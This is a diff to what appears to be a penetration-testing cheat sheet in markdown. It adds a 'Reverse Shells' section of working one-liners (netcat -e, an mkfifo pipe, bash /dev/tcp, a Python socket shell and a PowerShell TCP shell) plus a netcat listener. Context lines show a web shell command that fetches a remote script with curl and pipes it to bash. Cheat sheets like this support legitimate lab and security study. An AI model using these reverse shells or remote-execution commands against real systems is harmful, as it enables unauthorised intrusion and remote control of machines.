@@ -160,13 +160,6 @@ http://<domain name>/shell.php?cmd=id
 http://<domain name>/shell.php?cmd=curl%20<IP address>:8000/shell.sh|bash
 ```
 
-- Netcat
-
-```
-$ nc -nlvp <port>
-$ nc -nv <IP address> <port> -e cmd.exe
-```
-
 - Sqlmap
 
 ```
@@ -270,6 +263,7 @@ $ hashcat -a 0 -m 0 hashes.txt <wordlist>
 - Host Files
 
 ```
+$ nc -nlvp 443
 $ python -m SimpleHTTPServer 80
 $ python3 -m http.server 8000
 ```
@@ -300,13 +294,21 @@ $ script /dev/null -c bash
 $ CTRL+Z
 $ stty raw -echo
 $ fg
-$ export TERM=XTERM
+$ reset
 ```
+
 #8. - Reverse Shells
 -----------------------------------------
 
-- Shell Escapes
+- Reverse Shells
 
+```
+$ nc -nv <IP address> <port> -e /bin/bash
+$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP address> <port> >/tmp/f
+$ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+$ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP address>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
 
 #9 - Online Resources
 -----------------------------------------
